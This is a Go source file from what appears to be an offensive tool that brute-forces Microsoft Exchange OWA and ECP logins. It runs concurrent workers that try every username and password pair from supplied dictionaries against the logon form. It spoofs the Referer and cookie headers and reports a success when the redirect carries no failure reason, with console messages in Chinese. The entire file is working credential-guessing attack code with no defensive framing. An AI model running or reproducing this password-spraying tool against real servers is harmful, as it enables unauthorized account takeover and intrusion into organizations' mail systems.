package lib

import (
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

func HttpBruteWorker(targetUrl string, mode string, u string, domain string, task chan []string) {

	var refurl string
	if mode == "owa" {
		refurl, _ = url.JoinPath(targetUrl, "/owa/")
	} else {
		refurl, _ = url.JoinPath(targetUrl, "/ecp/")
	}
	referer, _ := url.JoinPath(targetUrl, "/owa/auth/logon.aspx?replaceCurrent=1&url="+refurl)

	for data := range task {
		username, password := data[0], data[1]
		form := url.Values{
			"destination":    {refurl},
			"flags":          {"4"},
			"forcedownlevel": {"0"},
			"username":       {domain + "\\" + username},
			"password":       {password},
			"passwordText":   {""},
			"isUtf8":         {"1"},
		}
		req, _ := http.NewRequest("POST", u, strings.NewReader(form.Encode()))
		req.Header.Set("Cache-Control", "max-age=0")
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Referer", referer)
		req.Header.Set("Cookie", "PrivateComputer=true; PBack=0")
		req.Header.Set("Connection", "close")

		res, _ := Client.Do(req)
		location := res.Header.Get("Location")

		if location == "" {
			//color.Red("[-] 失败: %v", username+":"+password)
		} else if !strings.Contains(location, "reason") {
			color.Green("[+] 成功: %v", username+":"+password)
		} else {
			//color.Red("[-] 失败: %v", username+":"+password)
		}
	}
}

func HttpBruteRun(targetUrl string, mode string, domain string, userDict []string, passDict []string, n int) {

	authPath := ExchangeUrls[mode]
	u, _ := url.JoinPath(targetUrl, authPath)
	fmt.Println("[*] 使用", mode, "接口爆破:", targetUrl)

	task := make(chan []string, len(userDict)*len(passDict))

	t1 := time.Now()

	for _, username := range userDict {
		for _, password := range passDict {
			data := []string{username, password}
			task <- data
		}
	}
	close(task)

	var wg sync.WaitGroup

	for i := 0; i < n; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			HttpBruteWorker(targetUrl, mode, u, domain, task)
		}()
	}

	wg.Wait()

	t2 := time.Now()
	fmt.Println("[*] 耗时:", t2.Sub(t1))
}
